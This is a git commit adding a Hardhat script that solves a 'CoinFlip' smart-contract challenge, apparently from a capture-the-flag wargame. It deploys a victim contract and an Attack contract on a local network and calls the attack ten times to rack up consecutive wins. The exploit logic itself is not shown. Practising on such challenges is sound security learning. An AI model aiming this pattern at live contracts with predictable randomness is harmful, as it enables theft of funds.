5c8649928a3ea074d70452daa3861e8feac2a796
donghyeon <tsvz1234@gmail.com>
2024-06-18 01:27:38 +0900

    Create solve.js

---
+++ Coinflip/solve.js
@@ -0,0 +1,28 @@
+const { showThrottleMessage } = require("ethers");
+const { ethers } = require("hardhat");
+
+async function main () {
+
+  const [vicm, attacker] = await ethers.getSigners();
+  const vicmcontract = await ethers.getContractFactory("CoinFlip");
+  const attackcontract = await ethers.getContractFactory("Attack");
+  const deploycontract_v = await vicmcontract.deploy();
+  const deploycontract_a = await attackcontract.deploy(deploycontract_v.target);
+
+  console.log("Flip contract deployed at: ", deploycontract_v.target);
+  console.log("Attack contract deployed at: ", deploycontract_a.target);
+
+  for (var i = 0; i<10; i++){
+    await deploycontract_a.letflip();
+  }
+
+  let number = await deploycontract_v.consecutiveWins();
+
+  console.log(number);
+  
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exit(1);
+})
